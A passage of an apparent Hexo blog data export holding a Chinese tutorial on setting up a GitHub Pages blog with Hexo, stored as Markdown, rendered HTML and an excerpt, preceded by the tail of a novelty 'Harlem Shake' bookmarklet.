s=\"mw-harlem_shake_me\";var o=\"im_first\";var u=[\"im_drunk\",\"im_baked\",\"im_trippin\",\"im_blown\"];var a=\"mw-st    robe_light\";var f=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css\";var l=\"mw_added_css\";var b=g();var w=y();var C=document.getElementsByTagName(\"*\");var k=null;for(var L=0;L&lt;    C.length;L++)&#123;var A=C[L];if(v(A))&#123;if(E(A))&#123;k=A;break&#125;&#125;&#125;if(A===null)&#123;console.warn(\"Could not find a node of the right size. Please try a different page.\");return&#125;c();S();var O=[];for(var L=0;L&lt;C.leng    th;L++)&#123;var A=C[L];if(v(A))&#123;O.push(A)&#125;&#125;&#125;)()'</span>&gt;</span>High一下!<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div></pre></td></tr></table></figure></p>\n"},{"title":"hexo搭建github博客","date":"2015-12-29T06:04:00.000Z","_content":"\n<img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、创建Github Pages\nGithub Pages为我们提供静态页面的托管。\n参见：[一步步在GitHub上创建博客主页(2)](http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html)\n\n### 1. 注册github账号\n登录github.com，创建用户账号：yeshaoting。\n访问地址：https://github.com/yeshaoting\n\n### 2. 配置和使用github\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n#### 生成新的SSH Key\n``` shell\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n```\n在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub\n\n#### 添加SSH key到github\n1) 查看并复制公钥id_rsa.pub内容。\n2) 登录github，在Accout Settings -> SSH Public Keys -> add another public keys\n3) 将复制id_rsa.pub内容复制到密钥文本框中。\n\n#### 测试\n``` shell\nssh -T git@github.com\n```\n\n<!-- more -->\n\n\n### 3. 创建项目仓库\n想建立个人博客，需要在github上建立yeshaoting.github.io的repository。\n其中，repository名必须是 **github账号名**.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。\n\n创建过程如下图所示：\n![github上建立仓库](http://cnfeat.qiniudn.com/13.png)\n\n\n## 二、安装hexo\nHexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n官方中文网址：https://hexo.io/zh-cn/\n\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n### 1. 安装node js\n登录：https://nodejs.org/，并下载安装包。\n安装或解压node js到对应的目录 NODEJS_HOME。\n将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。\n\n### 2. 安装hexo\nHexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。\n\n``` shell\nnpm install -g hexo-cli\n```\n\n## 三、建站\n创建hexo目录：hexo-blog\n\n\n## 初始化并安装hexo\n``` shell\ncd hexo-blog\nhexo init && npm install\n```\n\n重新安装，可以尝试使用如下命令：\n``` bash\ncd hexo-blog\nnpm install hexo --save\n```\n\n\n新建完成后，指定文件夹的目录如下：\n```\n.\n├── _config.yml\n├── package.json\n├── scaffolds\n├── scripts\n├── source\n|   ├── _drafts\n|   └── _posts\n└── themes\n```\n\n目录结构说明如下：\n**_config.yml**\n网站的 配置 信息，您可以在此配置大部分的参数。\n\n**package.json**\n应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。\n\n**scaffolds**\n模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。\n\n**scripts**\n脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。\n\n**source**\n资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。\n\n**themes**\n主题 文件夹。Hexo 会根据主题来生成静态页面。\n\n\n## 修改网站信息\n打开_config.yml，修改网站信息\n``` xml\n# Site\ntitle: 芳草地\nsubtitle: 叶绍亭\ndescription:\nauthor: yeshaoting\nlanguage: zh-CN\ntimezone: Asia/Shanghai\n```\n\n\n## 安装主题\n官方收纳的主题：http://hexo.io/themes/\n我选用 jacman 主题。\n点击进入http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用 Jacman 主题](http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。\n\n**注**：下载完主题后，需要修改_config.yml文件，如下所示：\n``` shell\ntheme: jacman\nstylus:\n  compress: true\n```\n\n## 四、服务部署\n参见：[hexo官方网站](https://hexo.io/zh-cn/docs/)\nHexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。\n\n\n### 安装 hexo-deployer-git\n`npm install hexo-deployer-git --save`\n\n### 修改配置\n``` shell\n# Deployment\n## Docs: http://hexo.io/docs/deployment.html\ndeploy:\n  type: git\n  repo: git@github.com:yeshaoting/yeshaoting.github.io.git\n  branch: master\n```\n\n### 发布到github\nhexo deploy\n\n一般，之前需要生成静态文件hexo generate，\n而在生成静态文件前，可以先清理之前的静态文件hexo clean。\n\n\n## 五、本地预览\n\n## 安装 hexo-server\n`npm install hexo-server --save`\n\n## 启动服务\n\n### 默认端口为4000\nhexo server\n\n### 指定端口为5000\nhexo server -p 5000\n\n### 指定地址\nhexo server -i 192.168.1.1\n\n\n## 五、常用操作\n\n### 创建文章\nhexo new [layout] &lt;title>\n新建的文章默认会被保存在source/_posts文件夹。\n其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。\n\n### 常用命令\n``` shell\nhexo new \"postName\" #新建文章\nhexo new page \"pageName\" #新建页面\nhexo generate #生成静态页面至public目录\nhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\nhexo deploy #将.deploy目录部署到GitHub\n```\n\n### 常用复合命令\n``` shell\nhexo d -g #生成加部署\nhexo s -g #预览加部署\n```\n\n### 简写\n``` shell\nhexo n == hexo new\nhexo g == hexo generate\nhexo s == hexo server\nhexo d == hexo deploy\n```","source":"_posts/article/hexo/hexo搭建github博客.md","raw":"title: hexo搭建github博客\ntags:\n  - hexo\ncategories:\n  - 博客搭建\ndate: 2015-12-29 14:04:00\n---\n\n<img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、创建Github Pages\nGithub Pages为我们提供静态页面的托管。\n参见：[一步步在GitHub上创建博客主页(2)](http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html)\n\n### 1. 注册github账号\n登录github.com，创建用户账号：yeshaoting。\n访问地址：https://github.com/yeshaoting\n\n### 2. 配置和使用github\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n#### 生成新的SSH Key\n``` shell\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n```\n在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub\n\n#### 添加SSH key到github\n1) 查看并复制公钥id_rsa.pub内容。\n2) 登录github，在Accout Settings -> SSH Public Keys -> add another public keys\n3) 将复制id_rsa.pub内容复制到密钥文本框中。\n\n#### 测试\n``` shell\nssh -T git@github.com\n```\n\n<!-- more -->\n\n\n### 3. 创建项目仓库\n想建立个人博客，需要在github上建立yeshaoting.github.io的repository。\n其中，repository名必须是 **github账号名**.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。\n\n创建过程如下图所示：\n![github上建立仓库](http://cnfeat.qiniudn.com/13.png)\n\n\n## 二、安装hexo\nHexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n官方中文网址：https://hexo.io/zh-cn/\n\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n### 1. 安装node js\n登录：https://nodejs.org/，并下载安装包。\n安装或解压node js到对应的目录 NODEJS_HOME。\n将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。\n\n### 2. 安装hexo\nHexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。\n\n``` shell\nnpm install -g hexo-cli\n```\n\n## 三、建站\n创建hexo目录：hexo-blog\n\n\n## 初始化并安装hexo\n``` shell\ncd hexo-blog\nhexo init && npm install\n```\n\n重新安装，可以尝试使用如下命令：\n``` bash\ncd hexo-blog\nnpm install hexo --save\n```\n\n\n新建完成后，指定文件夹的目录如下：\n```\n.\n├── _config.yml\n├── package.json\n├── scaffolds\n├── scripts\n├── source\n|   ├── _drafts\n|   └── _posts\n└── themes\n```\n\n目录结构说明如下：\n**_config.yml**\n网站的 配置 信息，您可以在此配置大部分的参数。\n\n**package.json**\n应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。\n\n**scaffolds**\n模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。\n\n**scripts**\n脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。\n\n**source**\n资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。\n\n**themes**\n主题 文件夹。Hexo 会根据主题来生成静态页面。\n\n\n## 修改网站信息\n打开_config.yml，修改网站信息\n``` xml\n# Site\ntitle: 芳草地\nsubtitle: 叶绍亭\ndescription:\nauthor: yeshaoting\nlanguage: zh-CN\ntimezone: Asia/Shanghai\n```\n\n\n## 安装主题\n官方收纳的主题：http://hexo.io/themes/\n我选用 jacman 主题。\n点击进入http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用 Jacman 主题](http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。\n\n**注**：下载完主题后，需要修改_config.yml文件，如下所示：\n``` shell\ntheme: jacman\nstylus:\n  compress: true\n```\n\n## 四、服务部署\n参见：[hexo官方网站](https://hexo.io/zh-cn/docs/)\nHexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。\n\n\n### 安装 hexo-deployer-git\n`npm install hexo-deployer-git --save`\n\n### 修改配置\n``` shell\n# Deployment\n## Docs: http://hexo.io/docs/deployment.html\ndeploy:\n  type: git\n  repo: git@github.com:yeshaoting/yeshaoting.github.io.git\n  branch: master\n```\n\n### 发布到github\nhexo deploy\n\n一般，之前需要生成静态文件hexo generate，\n而在生成静态文件前，可以先清理之前的静态文件hexo clean。\n\n\n## 五、本地预览\n\n## 安装 hexo-server\n`npm install hexo-server --save`\n\n## 启动服务\n\n### 默认端口为4000\nhexo server\n\n### 指定端口为5000\nhexo server -p 5000\n\n### 指定地址\nhexo server -i 192.168.1.1\n\n\n## 五、常用操作\n\n### 创建文章\nhexo new [layout] &lt;title>\n新建的文章默认会被保存在source/_posts文件夹。\n其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。\n\n### 常用命令\n``` shell\nhexo new \"postName\" #新建文章\nhexo new page \"pageName\" #新建页面\nhexo generate #生成静态页面至public目录\nhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\nhexo deploy #将.deploy目录部署到GitHub\n```\n\n### 常用复合命令\n``` shell\nhexo d -g #生成加部署\nhexo s -g #预览加部署\n```\n\n### 简写\n``` shell\nhexo n == hexo new\nhexo g == hexo generate\nhexo s == hexo server\nhexo d == hexo deploy\n```","slug":"article/hexo/hexo搭建github博客","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqn001i5nbtjl6gf85a","content":"<p><img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、创建Github-Pages\"><a href=\"#一、创建Github-Pages\" class=\"headerlink\" title=\"一、创建Github Pages\"></a>一、创建Github Pages</h2><p>Github Pages为我们提供静态页面的托管。<br>参见：<a href=\"http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html\" target=\"_blank\" rel=\"external\">一步步在GitHub上创建博客主页(2)</a></p>\n<h3 id=\"1-注册github账号\"><a href=\"#1-注册github账号\" class=\"headerlink\" title=\"1. 注册github账号\"></a>1. 注册github账号</h3><p>登录github.com，创建用户账号：yeshaoting。<br>访问地址：<a href=\"https://github.com/yeshaoting\" target=\"_blank\" rel=\"external\">https://github.com/yeshaoting</a></p>\n<h3 id=\"2-配置和使用github\"><a href=\"#2-配置和使用github\" class=\"headerlink\" title=\"2. 配置和使用github\"></a>2. 配置和使用github</h3><p>参见：<a href=\"http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/\" target=\"_blank\" rel=\"external\">如何搭建一个独立博客——简明 Github Pages与 jekyll 教程</a></p>\n<h4 id=\"生成新的SSH-Key\"><a href=\"#生成新的SSH-Key\" class=\"headerlink\" title=\"生成新的SSH Key\"></a>生成新的SSH Key</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh-keygen -t rsa -C &quot;yeshaoting@163.com&quot;</div></pre></td></tr></table></figure>\n<p>在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub</p>\n<h4 id=\"添加SSH-key到github\"><a href=\"#添加SSH-key到github\" class=\"headerlink\" title=\"添加SSH key到github\"></a>添加SSH key到github</h4><p>1) 查看并复制公钥id_rsa.pub内容。<br>2) 登录github，在Accout Settings -&gt; SSH Public Keys -&gt; add another public keys<br>3) 将复制id_rsa.pub内容复制到密钥文本框中。</p>\n<h4 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh -T git@github.com</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"3-创建项目仓库\"><a href=\"#3-创建项目仓库\" class=\"headerlink\" title=\"3. 创建项目仓库\"></a>3. 创建项目仓库</h3><p>想建立个人博客，需要在github上建立yeshaoting.github.io的repository。<br>其中，repository名必须是 <strong>github账号名</strong>.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。</p>\n<p>创建过程如下图所示：<br><img src=\"http://cnfeat.qiniudn.com/13.png\" alt=\"github上建立仓库\"></p>\n<h2 id=\"二、安装hexo\"><a href=\"#二、安装hexo\" class=\"headerlink\" title=\"二、安装hexo\"></a>二、安装hexo</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>\n<p>官方中文网址：<a href=\"https://hexo.io/zh-cn/\" target=\"_blank\" rel=\"external\">https://hexo.io/zh-cn/</a></p>\n<p>参见：<a href=\"http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/\" target=\"_blank\" rel=\"external\">如何搭建一个独立博客——简明 Github Pages与 jekyll 教程</a></p>\n<h3 id=\"1-安装node-js\"><a href=\"#1-安装node-js\" class=\"headerlink\" title=\"1. 安装node js\"></a>1. 安装node js</h3><p>登录：<a href=\"https://nodejs.org/，并下载安装包。\" target=\"_blank\" rel=\"external\">https://nodejs.org/，并下载安装包。</a><br>安装或解压node js到对应的目录 NODEJS_HOME。<br>将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。</p>\n<h3 id=\"2-安装hexo\"><a href=\"#2-安装hexo\" class=\"headerlink\" title=\"2. 安装hexo\"></a>2. 安装hexo</h3><p>Hexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install -g hexo-cli</div></pre></td></tr></table></figure>\n<h2 id=\"三、建站\"><a href=\"#三、建站\" class=\"headerlink\" title=\"三、建站\"></a>三、建站</h2><p>创建hexo目录：hexo-blog</p>\n<h2 id=\"初始化并安装hexo\"><a href=\"#初始化并安装hexo\" class=\"headerlink\" title=\"初始化并安装hexo\"></a>初始化并安装hexo</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd hexo-blog</div><div class=\"line\">hexo init &amp;&amp; npm install</div></pre></td></tr></table></figure>\n<p>重新安装，可以尝试使用如下命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> hexo-blog</div><div class=\"line\">npm install hexo --save</div></pre></td></tr></table></figure></p>\n<p>新建完成后，指定文件夹的目录如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">.</div><div class=\"line\">├── _config.yml</div><div class=\"line\">├── package.json</div><div class=\"line\">├── scaffolds</div><div class=\"line\">├── scripts</div><div class=\"line\">├── source</div><div class=\"line\">|   ├── _drafts</div><div class=\"line\">|   └── _posts</div><div class=\"line\">└── themes</div></pre></td></tr></table></figure></p>\n<p>目录结构说明如下：<br><strong>_config.yml</strong><br>网站的 配置 信息，您可以在此配置大部分的参数。</p>\n<p><strong>package.json</strong><br>应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。</p>\n<p><strong>scaffolds</strong><br>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p>\n<p><strong>scripts</strong><br>脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。</p>\n<p><strong>source</strong><br>资源文件夹是存放用户资源的地方。除 <em>posts 文件夹之外，开头命名为 </em> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p>\n<p><strong>themes</strong><br>主题 文件夹。Hexo 会根据主题来生成静态页面。</p>\n<h2 id=\"修改网站信息\"><a href=\"#修改网站信息\" class=\"headerlink\" title=\"修改网站信息\"></a>修改网站信息</h2><p>打开_config.yml，修改网站信息<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"># Site</div><div class=\"line\">title: 芳草地</div><div class=\"line\">subtitle: 叶绍亭</div><div class=\"line\">description:</div><div class=\"line\">author: yeshaoting</div><div class=\"line\">language: zh-CN</div><div class=\"line\">timezone: Asia/Shanghai</div></pre></td></tr></table></figure></p>\n<h2 id=\"安装主题\"><a href=\"#安装主题\" class=\"headerlink\" title=\"安装主题\"></a>安装主题</h2><p>官方收纳的主题：<a href=\"http://hexo.io/themes/\" target=\"_blank\" rel=\"external\">http://hexo.io/themes/</a><br>我选用 jacman 主题。<br>点击进入<a href=\"http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用\" target=\"_blank\" rel=\"external\">http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用</a> Jacman 主题](<a href=\"http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。\" target=\"_blank\" rel=\"external\">http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。</a></p>\n<p><strong>注</strong>：下载完主题后，需要修改_config.yml文件，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">theme: jacman</div><div class=\"line\">stylus:</div><div class=\"line\">  compress: true</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、服务部署\"><a href=\"#四、服务部署\" class=\"headerlink\" title=\"四、服务部署\"></a>四、服务部署</h2><p>参见：<a href=\"https://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"external\">hexo官方网站</a><br>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p>\n<h3 id=\"安装-hexo-deployer-git\"><a href=\"#安装-hexo-deployer-git\" class=\"headerlink\" title=\"安装 hexo-deployer-git\"></a>安装 hexo-deployer-git</h3><p><code>npm install hexo-deployer-git --save</code></p>\n<h3 id=\"修改配置\"><a href=\"#修改配置\" class=\"headerlink\" title=\"修改配置\"></a>修改配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"># Deployment</div><div class=\"line\">## Docs: http://hexo.io/docs/deployment.html</div><div class=\"line\">deploy:</div><div class=\"line\">  type: git</div><div class=\"line\">  repo: git@github.com:yeshaoting/yeshaoting.github.io.git</div><div class=\"line\">  branch: master</div></pre></td></tr></table></figure>\n<h3 id=\"发布到github\"><a href=\"#发布到github\" class=\"headerlink\" title=\"发布到github\"></a>发布到github</h3><p>hexo deploy</p>\n<p>一般，之前需要生成静态文件hexo generate，<br>而在生成静态文件前，可以先清理之前的静态文件hexo clean。</p>\n<h2 id=\"五、本地预览\"><a href=\"#五、本地预览\" class=\"headerlink\" title=\"五、本地预览\"></a>五、本地预览</h2><h2 id=\"安装-hexo-server\"><a href=\"#安装-hexo-server\" class=\"headerlink\" title=\"安装 hexo-server\"></a>安装 hexo-server</h2><p><code>npm install hexo-server --save</code></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><h3 id=\"默认端口为4000\"><a href=\"#默认端口为4000\" class=\"headerlink\" title=\"默认端口为4000\"></a>默认端口为4000</h3><p>hexo server</p>\n<h3 id=\"指定端口为5000\"><a href=\"#指定端口为5000\" class=\"headerlink\" title=\"指定端口为5000\"></a>指定端口为5000</h3><p>hexo server -p 5000</p>\n<h3 id=\"指定地址\"><a href=\"#指定地址\" class=\"headerlink\" title=\"指定地址\"></a>指定地址</h3><p>hexo server -i 192.168.1.1</p>\n<h2 id=\"五、常用操作\"><a href=\"#五、常用操作\" class=\"headerlink\" title=\"五、常用操作\"></a>五、常用操作</h2><h3 id=\"创建文章\"><a href=\"#创建文章\" class=\"headerlink\" title=\"创建文章\"></a>创建文章</h3><p>hexo new [layout] &lt;title&gt;<br>新建的文章默认会被保存在source/_posts文件夹。<br>其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。</p>\n<h3 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo new &quot;postName&quot; #新建文章</div><div class=\"line\">hexo new page &quot;pageName&quot; #新建页面</div><div class=\"line\">hexo generate #生成静态页面至public目录</div><div class=\"line\">hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</div><div class=\"line\">hexo deploy #将.deploy目录部署到GitHub</div></pre></td></tr></table></figure>\n<h3 id=\"常用复合命令\"><a href=\"#常用复合命令\" class=\"headerlink\" title=\"常用复合命令\"></a>常用复合命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo d -g #生成加部署</div><div class=\"line\">hexo s -g #预览加部署</div></pre></td></tr></table></figure>\n<h3 id=\"简写\"><a href=\"#简写\" class=\"headerlink\" title=\"简写\"></a>简写</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo n == hexo new</div><div class=\"line\">hexo g == hexo generate</div><div class=\"line\">hexo s == hexo server</div><div class=\"line\">hexo d == hexo deploy</div></pre></td></tr></table></figure>","excerpt":"<p><img src=\"/asserts/images/logo/blog.png\" title=\"hexo\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、创建Github-Pages\"><a href=\"#一、创建Github-Pages\" class=\"headerlink\" title=\"一、创建Github Pages\"></a>一、创建Github Pages</h2><p>Github Pages为我们提供静态页面的托管。<br>参见：<a href=\"http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html\">一步步在GitHub上创建博客主页(2)</a></p>\n<h3 id=\"1-注册github账号\"><a href=\"#1-注册github账号\" class=\"headerlink\" title=\"1. 注册github账号\"></a>1. 注册github账号</h3><p>登录github.com，创建用户账号：yeshaoting。<br>访问地址：<a href=\"https://github.com/yeshaoting\">https://github.com/yeshaoting</a></p>\n<h3 id=\"2-配置和使用github\"><a href=\"#2-配置和使用github\" class=\"headerlink\" title=\"2. 配置和使用github\"></a>2. 配置和使用github</h3><p>参见：<a href=\"http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/\">如何搭建一个独立博客——简明 Github Pages与 jekyll 教程</a></p>\n<h4 id=\"生成新的SSH-Key\"><a href=\"#生成新的SSH-Key\" class=\"headerlink\" title=\"生成新的SSH Key\"></a>生成新的SSH Key</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh-keygen -t rsa -C &quot;yeshaoting@163.com&quot;</div></pre></td></tr></table></figure>\n<p>在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub</p>\n<h4 id=\"添加SSH-key到github\"><a href=\"#添加SSH-key到github\" class=\"headerlink\" title=\"添加SSH key到github\"></a>添加SSH key到github</h4><p>1) 查看并复制公钥id_rsa.pub内容。<br>2) 登录github，在Accout Settings -&gt; SSH Public Keys -&gt; add another public keys<br>3) 将复制id_rsa.pub内容复制到密钥文本框中。</p>\n<h4 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh -T git@github.com</div></pre></td></tr></table></figure>","more":"<h3 id=\"3-创建项目仓库\"><a href=\"#3-创建项目仓库\" class=\"headerlink\" title=\"3. 创建项目仓库\"></a>3. 创建项目仓库</h3><p>想建立个人博客，需要在github上建立yeshaoting.github.io的repository。<br>其中，repository名必须是 <strong>github账号名</strong>.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。</p>\n<p>创建过程如下图所示：<br><img src=\"http://cnfeat.qiniudn.com/13.png\" alt=\"github上建立仓库\"></p>\n<h2 id=\"二、安装hexo\"><a href=\"#二、安装hexo\" class=\"headerlink\" title=\"二、安装hexo\"></a>二、安装hexo</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>\n<p>官方中文网址：<a href=\"https://hexo.io/zh-cn/\">https://hexo.io/zh-cn/</a></p>\n<p>参见：<a href=\"http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/\">如何搭建一个独立博客——简明 Github Pages与 jekyll 教程</a></p>\n<h3 id=\"1-安装node-js\"><a href=\"#1-安装node-js\" class=\"headerlink\" title=\"1. 安装node js\"></a>1. 安装node js</h3><p>登录：<a href=\"https://nodejs.org/，并下载安装包。\">https://nodejs.org/，并下载安装包。</a><br>安装或解压node js到对应的目录 NODEJS_HOME。<br>将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。</p>\n<h3 id=\"2-安装hexo\"><a href=\"#2-安装hexo\" class=\"headerlink\" title=\"2. 安装hexo\"></a>2. 安装hexo</h3><p>Hexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install -g hexo-cli</div></pre></td></tr></table></figure>\n<h2 id=\"三、建站\"><a href=\"#三、建站\" class=\"headerlink\" title=\"三、建站\"></a>三、建站</h2><p>创建hexo目录：hexo-blog</p>\n<h2 id=\"初始化并安装hexo\"><a href=\"#初始化并安装hexo\" class=\"headerlink\" title=\"初始化并安装hexo\"></a>初始化并安装hexo</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd hexo-blog</div><div class=\"line\">hexo init &amp;&amp; npm install</div></pre></td></tr></table></figure>\n<p>重新安装，可以尝试使用如下命令：<br><figure class=\"highlight bash\"><table><tr><td 